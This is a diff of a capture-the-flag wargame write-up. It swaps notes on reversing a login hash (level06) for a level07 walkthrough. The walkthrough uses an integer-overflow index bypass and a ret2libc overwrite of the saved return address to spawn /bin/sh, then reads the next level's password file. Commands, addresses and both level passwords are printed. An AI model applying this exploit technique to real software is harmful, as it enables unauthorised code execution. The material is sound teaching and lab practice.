@@ -1,26 +1,99 @@
 1. ssh level07@192.168.56.101 -p 4242
 2. ls -la
 3. ./level07
+We can store and read from memory
 
-4. scp -P 4242 level06@192.168.56.101:/home/users/level06/level06 .
+4. scp -P 4242 level07@192.168.56.101:/home/users/level07/level07 .
 5. open /Application/IDA Freeware 7.7/ida64.app
-6. analyze level06 ELF binary ->
+6. analyze level07 ELF binary ->
     ...
-    auth function uses login hashing function to create pass (pretty dummy):
-    login must be >= 6
-    initial hash is ((int)login[3] ^ 0x1337U) + 0x5eeded
-    for each letter hash + ((int)login[i] ^ hash) % 0x539
+    push    ebp
+    ...
+    push    edi
+    push    esi
+    push    ebx
+    and     esp, 0FFFFFFF0h
+    sub     esp, 1D0h ; 464
+    ...
+    lea     ebx, [esp+24h] ; 36
 
-7. Australian trip
-So, there are gdb and ptrace protection, it's too expensive
-Let's just recreate C source with hash function
+We need to rewrite EIP to spoof func execution with system("/bin/sh")
 
-8. Add `printf("%d", pass)` to recreated C source and run
-    >> nickaroot
-    << 6235776
+    stack size: 464 / 4 = 116
+    buffer start: 36 / 4 = 9
+    pushed buffers: 16 / 4 = 4
+    alignment diff: 12 / 4 = 3
 
-Authenticated!
+116 - 9 + 4 + 3 = 114 — EIP/RIP
 
-    >> cat /home/users/level07/.pass
+Just test it with read
 
-GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8
+./level07
+    >> read
+    >> 114
+    << Number at data[114] is 4158936339
+    << Completed read command successfully
+    >> store
+    >> 0
+    >> 114
+    << This index is reserved for wil!
+
+7. open Ghidra [s]to buy smth.[/s] to analyze store function
+        `get_unum()` for number and index
+        index % 3 == 0 || number >> 0x18 == 0xb7 -> reserved
+
+        *(uint *)(index * 4 + param_1) = number -> save 4-byte int
+        
+114 % 3 = 0 — we only can overflow with 2**32 / 4 -> 2**30
+2**30 + 114 = 1073741938
+
+1073741938 % 3 = 1 — That's good!
+
+8. Store at overflowed 114 EIP index
+    ./level07
+    >> store
+    >> 0
+    >> 1073741938
+    << Completed store command successfully
+
+    >> read
+    >> 114
+    << Number at data[114] is 0
+
+GOOD! Now we should run system with "/bin/sh" using EIP
+
+9. Replace EIP with system address
+    gdb level07
+    (gdb) r
+    Ctrl+C
+    (gdb) info function system
+    
+0xf7e6aed0 ; 4159090384
+
+10. Search for "/bin/sh" at libc.so
+    gdb level07
+    (gdb) r
+    Ctrl+C
+    (gdb) info proc map
+
+0xf7e2c000...0xf7fcc000 — libc-2.15.so
+
+    (gdb) find libc-2.15.so "/bin/sh"
+
+0xf7f897ec ; 4160264172
+
+11. Store 4159090384 (system) at 1073741938 (EIP — 114) and 4160264172 ("/bin/sh") at 116
+    ./level07
+    >> store
+    >> 4159090384
+    >> 1073741938
+    << Completed store command successfully
+    >> store
+    >> 4160264172
+    >> 116
+    << Completed store command successfully
+    >> quit
+    << $
+    >> cat /home/users/level08/.pass
+
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
